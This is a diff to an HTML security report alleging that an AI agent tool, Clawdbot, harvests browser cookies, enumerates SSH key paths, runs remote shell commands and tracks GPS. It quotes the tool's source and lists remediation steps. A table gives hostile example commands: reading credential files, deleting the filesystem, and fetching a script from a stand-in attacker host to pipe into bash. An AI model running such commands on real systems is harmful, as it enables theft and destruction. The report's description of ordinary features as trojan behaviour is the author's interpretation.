@@ -282,6 +282,10 @@
       <div class="label">Messaging Platforms</div>
     </div>
     <div class="stat-box">
+      <div class="number">RAT</div>
+      <div class="label">Remote Shell Access</div>
+    </div>
+    <div class="stat-box">
       <div class="number">0</div>
       <div class="label">Consent Prompts</div>
     </div>
@@ -299,7 +303,11 @@
       <li><strong>Camera access</strong> for photos and video, remotely triggered (iOS & Android)</li>
       <li><strong>Silent exfiltration</strong> — captured media transmitted to gateway with no user notification</li>
       <li><strong>Message interception</strong> across WhatsApp, iMessage, Signal, Telegram</li>
+      <li><strong>Browser session theft</strong> — cookies and localStorage from all sites via Playwright/CDP</li>
+      <li><strong>Remote command execution</strong> — arbitrary shell commands on paired devices</li>
+      <li><strong>GPS location tracking</strong> — precise device coordinates on demand</li>
       <li><strong>Credential harvesting</strong> from Claude Code, OpenAI Codex, Qwen CLI</li>
+      <li><strong>SSH config enumeration</strong> — discovers private key paths for potential exfiltration</li>
       <li><strong>Persistent daemon</strong> that auto-starts and respawns after termination</li>
       <li><strong>AI agent autonomy</strong> to activate surveillance without user consent</li>
       <li><strong>Silent activation</strong> with no approval process</li>
@@ -309,8 +317,10 @@
   <div class="toc">
     <h3>Table of Contents</h3>
     <ol>
-      <li><a href="#credential-harvesting">Credential Harvesting</a></li>
+      <li><a href="#credential-harvesting">Credential Harvesting & SSH Enumeration</a></li>
       <li><a href="#surveillance">Screen Recording & Camera Access</a></li>
+      <li><a href="#browser-theft">Browser Session Theft</a></li>
+      <li><a href="#remote-exec">Remote Command Execution</a></li>
       <li><a href="#messages">Message Interception</a></li>
       <li><a href="#persistence">Persistent Daemon</a></li>
       <li><a href="#execution">Execution Path Analysis</a></li>
@@ -327,7 +337,7 @@
   <div class="section" id="credential-harvesting">
     <div class="section-header">
       <span class="num">1</span>
-      Credential Harvesting from Competing AI Tools
+      Credential Harvesting & SSH Key Enumeration
     </div>
     <div class="section-content">
       <p>Clawdbot automatically reads OAuth tokens from other AI CLI tools <strong>without informed consent</strong>:</p>
@@ -460,6 +470,38 @@
           <li>This isn't legacy code — it's <strong>actively developed</strong></li>
         </ul>
       </div>
+
+      <h3>SSH Config Enumeration — Private Key Path Discovery</h3>
+      <p>Clawdbot includes functionality to parse SSH configurations, extracting user, hostname, port, and <strong>identity file paths</strong> (private keys):</p>
+
+      <div class="file-path">src/infra/ssh-config.ts (lines 48-95)</div>
+      <pre><code><span class="keyword">export async function</span> <span class="function">resolveSshConfig</span>(
+  target: SshParsedTarget,
+  opts: { identity?: <span class="keyword">string</span>; timeoutMs?: <span class="keyword">number</span> } = {},
+): Promise&lt;SshResolvedConfig | <span class="keyword">null</span>&gt; {
+  <span class="keyword">const</span> sshPath = <span class="string">"/usr/bin/ssh"</span>;
+  <span class="keyword">const</span> args = [<span class="string">"-G"</span>];  <span class="comment">// Dumps effective SSH config</span>
+  <span class="comment">// ...</span>
+  <span class="keyword">const</span> child = <span class="function">spawn</span>(sshPath, args, { ... });
+}</code></pre>
+
+      <div class="file-path">src/infra/ssh-config.ts (lines 19-46) — Parser extracts key paths</div>
+      <pre><code><span class="keyword">export function</span> <span class="function">parseSshConfigOutput</span>(output: <span class="keyword">string</span>): SshResolvedConfig {
+  <span class="keyword">const</span> result: SshResolvedConfig = { identityFiles: [] };
+  <span class="comment">// ...</span>
+  <span class="keyword">switch</span> (key) {
+    <span class="keyword">case</span> <span class="string">"user"</span>: result.user = value; <span class="keyword">break</span>;
+    <span class="keyword">case</span> <span class="string">"hostname"</span>: result.host = value; <span class="keyword">break</span>;
+    <span class="keyword">case</span> <span class="string">"port"</span>: result.port = <span class="function">parsePort</span>(value); <span class="keyword">break</span>;
+<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"identityfile"</span>:</span>
+<span class="highlight-line">      <span class="keyword">if</span> (value !== <span class="string">"none"</span>) result.identityFiles.<span class="function">push</span>(value);  <span class="comment">// Collects key paths</span></span>
+      <span class="keyword">break</span>;
+  }
+}</code></pre>
+
+      <div class="warning">
+        <strong>This discovers SSH private key locations:</strong> <code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, or any custom paths. Combined with general file read capabilities, this enables SSH key theft.
+      </div>
     </div>
   </div>
 
@@ -577,6 +619,151 @@ Payload(<span class="string">"""{"format":"jpg","base64":"$base64","width":${res
       </ul>
       <div class="warning">
         <strong>Any one of these would be concerning. Together, they form a complete covert exfiltration pipeline — one that can operate autonomously without any human at the controls.</strong>
+      </div>
+    </div>
+  </div>
+
+  <!-- Section 2b: Browser Session Theft -->
+  <div class="section" id="browser-theft">
+    <div class="section-header">
+      <span class="num">2b</span>
+      Browser Session Theft — Cookies & Storage
+    </div>
+    <div class="section-content">
+      <p>Clawdbot includes full browser session access via Playwright/CDP (Chrome DevTools Protocol), enabling theft of cookies and localStorage from <strong>any website the user is logged into</strong>:</p>
+
+      <h3>Cookie Extraction</h3>
+      <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 3-11)</div>
+      <pre><code><span class="keyword">export async function</span> <span class="function">cookiesGetViaPlaywright</span>(opts: {
+  cdpUrl: <span class="keyword">string</span>;
+  targetId?: <span class="keyword">string</span>;
+}): Promise&lt;{ cookies: unknown[] }&gt; {
+  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
+  <span class="function">ensurePageState</span>(page);
+<span class="highlight-line">  <span class="keyword">const</span> cookies = <span class="keyword">await</span> page.<span class="function">context</span>().<span class="function">cookies</span>();  <span class="comment">// ALL cookies from ALL sites</span></span>
+  <span class="keyword">return</span> { cookies };
+}</code></pre>
+
+      <h3>localStorage/sessionStorage Theft</h3>
+      <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 57-86)</div>
+      <pre><code><span class="keyword">export async function</span> <span class="function">storageGetViaPlaywright</span>(opts: {
+  cdpUrl: <span class="keyword">string</span>;
+  targetId?: <span class="keyword">string</span>;
+  kind: <span class="string">"local"</span> | <span class="string">"session"</span>;
+  key?: <span class="keyword">string</span>;
+}): Promise&lt;{ values: Record&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt; }&gt; {
+  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
+  <span class="keyword">const</span> values = <span class="keyword">await</span> page.<span class="function">evaluate</span>(({ kind }) => {
+<span class="highlight-line">    <span class="keyword">const</span> store = kind === <span class="string">"session"</span> ? window.sessionStorage : window.localStorage;</span>
+    <span class="keyword">const</span> out = {};
+<span class="highlight-line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = 0; i &lt; store.length; i++) {  <span class="comment">// Dumps ALL keys</span></span>
+      <span class="keyword">const</span> k = store.<span class="function">key</span>(i);
+      <span class="keyword">if</span> (k) out[k] = store.<span class="function">getItem</span>(k);
+    }
+    <span class="keyword">return</span> out;
+  }, { kind });
+}</code></pre>
+
+      <h3>CLI Commands for Cookie/Storage Access</h3>
+      <div class="file-path">src/cli/browser-cli-state.cookies-storage.ts</div>
+      <pre><code><span class="comment">// Available commands:</span>
+cookies                 <span class="comment">// Get all browser cookies</span>
+cookies set &lt;name&gt; &lt;value&gt; --url &lt;url&gt;  <span class="comment">// Inject cookies</span>
+cookies clear           <span class="comment">// Clear all cookies</span>
+storage local get       <span class="comment">// Get all localStorage</span>
+storage session get     <span class="comment">// Get all sessionStorage</span></code></pre>
+
+      <div class="warning">
+        <strong>Session Hijacking Potential:</strong>
+        <ul style="margin-top: 8px; margin-left: 20px;">
+          <li><strong>Banking sites</strong> — session cookies enable account access</li>
+          <li><strong>Email</strong> — Gmail, Outlook tokens can be stolen</li>
+          <li><strong>Social media</strong> — Facebook, Twitter, LinkedIn sessions</li>
+          <li><strong>Corporate apps</strong> — SSO tokens, internal tool access</li>
+          <li><strong>Crypto exchanges</strong> — API keys often stored in localStorage</li>
+        </ul>
+        <p style="margin-top: 12px;">Any site the user has visited can have its session tokens extracted and used elsewhere.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Section 2c: Remote Command Execution -->
+  <div class="section" id="remote-exec">
+    <div class="section-header">
+      <span class="num">2c</span>
+      Remote Command Execution — Arbitrary Shell Access
+    </div>
+    <div class="section-content">
+      <p>The <code>nodes</code> tool includes a <code>system.run</code> command that executes <strong>arbitrary shell commands</strong> on any paired device:</p>
+
+      <div class="file-path">src/agents/tools/nodes-tool.ts (lines 388-441)</div>
+      <pre><code><span class="keyword">case</span> <span class="string">"run"</span>: {
+  <span class="keyword">const</span> node = <span class="function">readStringParam</span>(params, <span class="string">"node"</span>, { required: <span class="keyword">true</span> });
+  <span class="comment">// ...</span>
+  <span class="keyword">const</span> commandRaw = params.command;
+<span class="highlight-line">  <span class="keyword">if</span> (!Array.<span class="function">isArray</span>(commandRaw)) {</span>
+<span class="highlight-line">    <span class="keyword">throw new</span> Error(<span class="string">"command must be an array of strings (argv)"</span>);</span>
+<span class="highlight-line">  }</span>
+  <span class="keyword">const</span> command = commandRaw.<span class="function">map</span>((c) => String(c));
+  <span class="keyword">const</span> cwd = params.cwd;  <span class="comment">// Working directory</span>
+  <span class="keyword">const</span> env = <span class="function">parseEnvPairs</span>(params.env);  <span class="comment">// Environment variables</span>
+
+<span class="highlight-line">  <span class="keyword">const</span> raw = <span class="keyword">await</span> <span class="function">callGatewayTool</span>(<span class="string">"node.invoke"</span>, gatewayOpts, {</span>
+<span class="highlight-line">    nodeId,</span>
+<span class="highlight-line">    command: <span class="string">"system.run"</span>,  <span class="comment">// Executes any command</span></span>
+<span class="highlight-line">    params: { command, cwd, env, ... },</span>
+<span class="highlight-line">  });</span>
+}</code></pre>
+
+      <h3>What This Enables</h3>
+      <table>
+        <tr>
+          <th>Command Example</th>
+          <th>Impact</th>
+        </tr>
+        <tr>
+          <td><code>["cat", "/etc/passwd"]</code></td>
+          <td>Read system files</td>
+        </tr>
+        <tr>
+          <td><code>["cat", "~/.ssh/id_rsa"]</code></td>
+          <td>Steal SSH private keys</td>
+        </tr>
+        <tr>
+          <td><code>["cat", "~/.env"]</code></td>
+          <td>Steal environment secrets</td>
+        </tr>
+        <tr>
+          <td><code>["curl", "http://attacker.com/shell.sh", "|", "bash"]</code></td>
+          <td>Download and execute malware</td>
+        </tr>
+        <tr>
+          <td><code>["rm", "-rf", "/"]</code></td>
+          <td>Destructive commands</td>
+        </tr>
+      </table>
+
+      <div class="warning">
+        <strong>This is a Remote Access Trojan (RAT) capability.</strong> Combined with the persistent daemon, any paired device can have arbitrary commands executed remotely with no user consent or notification.
+      </div>
+
+      <h3>GPS Location Tracking</h3>
+      <p>The same <code>nodes</code> tool also includes location tracking:</p>
+      <div class="file-path">src/agents/tools/nodes-tool.ts (lines 358-386)</div>
+      <pre><code><span class="keyword">case</span> <span class="string">"location_get"</span>: {
+  <span class="keyword">const</span> node = <span class="function">readStringParam</span>(params, <span class="string">"node"</span>, { required: <span class="keyword">true</span> });
+  <span class="keyword">const</span> nodeId = <span class="keyword">await</span> <span class="function">resolveNodeId</span>(gatewayOpts, node);
+  <span class="keyword">const</span> desiredAccuracy = params.desiredAccuracy;  <span class="comment">// coarse | balanced | precise</span>
+
+<span class="highlight-line">  <span class="keyword">const</span> raw = <span class="keyword">await</span> <span class="function">callGatewayTool</span>(<span class="string">"node.invoke"</span>, gatewayOpts, {</span>
+<span class="highlight-line">    nodeId,</span>
+<span class="highlight-line">    command: <span class="string">"location.get"</span>,  <span class="comment">// Gets GPS coordinates</span></span>
+<span class="highlight-line">    params: { maxAgeMs, desiredAccuracy, timeoutMs },</span>
+<span class="highlight-line">  });</span>
+}</code></pre>
+
+      <div class="explanation">
+        <strong>Precise GPS tracking</strong> of any paired mobile device. Combined with camera/screen recording, this enables comprehensive physical surveillance.
       </div>
     </div>
   </div>
@@ -797,6 +984,24 @@ KeepAlive=true (respawns if killed)
           <td><span class="tag tag-yellow">ONCE (OS)</span></td>
           <td><span class="tag tag-red">NO</span></td>
           <td><span class="tag tag-red">YES — on boot</span></td>
+        </tr>
+        <tr>
+          <td>Browser cookies</td>
+          <td><span class="tag tag-red">NO</span></td>
+          <td><span class="tag tag-red">NO</span></td>
+          <td>On agent/remote command</td>
+        </tr>
+        <tr>
+          <td>Remote shell (system.run)</td>
+          <td><span class="tag tag-red">NO</span></td>
+          <td><span class="tag tag-red">NO</span></td>
+          <td>On agent/remote command</td>
+        </tr>
+        <tr>
+          <td>GPS location</td>
+          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
+          <td><span class="tag tag-red">NO</span></td>
+          <td>On agent/remote command</td>
         </tr>
       </table>
       <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">*Screen record: macOS permission can be suppressed via <code>interactive=false</code> parameter.</p>
@@ -1022,6 +1227,18 @@ KeepAlive=true (respawns if killed)
           <td>Base64 encoding</td>
           <td>Everything packaged and ready for transmission</td>
         </tr>
+        <tr>
+          <td>Browser session theft</td>
+          <td>Banking, email, corporate SSO, any logged-in site</td>
+        </tr>
+        <tr>
+          <td>Remote shell execution</td>
+          <td>Full system compromise, malware installation, data destruction</td>
+        </tr>
+        <tr>
+          <td>GPS tracking</td>
+          <td>Physical location surveillance, pattern-of-life analysis</td>
+        </tr>
       </table>
 
       <h3>Who is at risk:</h3>
@@ -1076,8 +1293,11 @@ npm uninstall -g clawdbot moltbot</code></pre>
         <li><strong>Claude Code:</strong> Log out and back in to get new OAuth tokens</li>
         <li><strong>OpenAI Codex:</strong> Regenerate API keys</li>
         <li><strong>Qwen CLI:</strong> Re-authenticate</li>
-        <li><strong>SSH keys:</strong> Consider regenerating if concerned</li>
+        <li><strong>SSH keys:</strong> Consider regenerating if concerned (paths may have been enumerated)</li>
+        <li><strong>Browser sessions:</strong> Log out of all sites and clear cookies — assume all sessions compromised</li>
+        <li><strong>Banking/Financial:</strong> Reset passwords for any financial accounts accessed in browser</li>
         <li><strong>Messaging apps:</strong> Revoke linked devices (WhatsApp, Signal, etc.)</li>
+        <li><strong>Environment files:</strong> Rotate any secrets in .env files that may have been accessed</li>
       </ul>
     </div>
   </div>
@@ -1090,12 +1310,16 @@ npm uninstall -g clawdbot moltbot</code></pre>
     <ul>
       <li><code>src/agents/cli-credentials.ts</code> — Credential harvesting functions</li>
       <li><code>src/agents/auth-profiles/external-cli-sync.ts</code> — Automatic credential sync</li>
+      <li><code>src/infra/ssh-config.ts</code> — SSH config parsing, identity file enumeration (lines 19-95)</li>
       <li><code>apps/macos/Sources/Moltbot/ScreenRecordService.swift</code> — macOS screen recording</li>
       <li><code>apps/android/.../ScreenRecordManager.kt</code> — Android screen recording (lines 117-122: base64 encoding)</li>
       <li><code>apps/android/.../CameraCaptureManager.kt</code> — Camera capture (lines 133-136: base64 encoding)</li>
       <li><code>apps/android/.../NodeRuntime.kt</code> — Invoke handler, misleading UI (lines 943-1044)</li>
       <li><code>apps/android/.../GatewaySession.kt</code> — Remote triggering (lines 450-455), WebSocket transmission (lines 498-525)</li>
       <li><code>apps/android/.../NodeForegroundService.kt</code> — No audit trail (lines 46-54)</li>
+      <li><code>src/browser/pw-tools-core.storage.ts</code> — Browser cookie/storage theft (lines 3-86)</li>
+      <li><code>src/cli/browser-cli-state.cookies-storage.ts</code> — CLI commands for cookie access</li>
+      <li><code>src/agents/tools/nodes-tool.ts</code> — Remote command execution (lines 388-441), GPS tracking (lines 358-386)</li>
       <li><code>src/web/inbound/monitor.ts</code> — WhatsApp message monitoring</li>
       <li><code>src/imessage/monitor/monitor-provider.ts</code> — iMessage monitoring</li>
       <li><code>src/daemon/launchd-plist.ts</code> — LaunchAgent configuration</li>
@@ -1133,7 +1357,7 @@ npm uninstall -g clawdbot moltbot</code></pre>
   </div>
 
   <div class="footer">
-    <p><strong>Report generated:</strong> January 29, 2026 (Updated with exfiltration chain analysis)</p>
+    <p><strong>Report generated:</strong> January 30, 2026 (Updated with browser session theft, remote shell execution, GPS tracking, SSH enumeration)</p>
     <p><strong>Clawdbot version analyzed:</strong> 2026.1.24-3</p>
     <p><strong>Analysis method:</strong> Static analysis of public GitHub repository combined with brief runtime audit of installed application (promptly removed after discovery)</p>
     <p style="margin-top: 16px; color: #f85149;"><strong>SHA256:</strong> <code>5ebe61a486321518e452e3059f55c0918b363ba6e14c44e25f77932034f039b5</code></p>
